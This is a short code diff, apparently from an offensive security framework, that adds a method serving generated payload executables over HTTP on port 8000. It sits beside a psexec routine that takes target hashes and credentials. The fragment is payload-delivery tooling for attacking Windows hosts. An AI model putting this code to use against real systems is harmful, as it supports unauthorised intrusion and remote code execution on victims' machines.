@@ -240,3 +240,17 @@ class FUNCTIONS(object):
             target=self.ServePsexec, args=(payloaddir + '/' + payloadname, targethash, targetusername, targetdomain, targetipaddr, targetpassword))
         b.daemon = True
         b.start()
+
+    def DoServe(self,want_to_payloadinexe,want_to_upload,IP,payloadinexe_payloadnameshort,payloadname,payloaddir):
+        if want_to_payloadinexe == 'y' and want_to_upload.lower() == 'y' or want_to_payloadinexe == 'y' and want_to_upload.lower() == '':
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadnameshort.group(0)) + t.normal
+            a = multiprocessing.Process(
+                target=self.ServePayload, args=(os.getcwd() + '/compiled',))
+            a.daemon = True
+            a.start()
+        elif want_to_payloadinexe == 'n' and want_to_upload.lower() == 'y' or want_to_payloadinexe == '' and want_to_upload.lower() == '':
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadname) + t.normal
+            a = multiprocessing.Process(
+                target=self.ServePayload, args=(payloaddir,))
+            a.daemon = True
+            a.start()
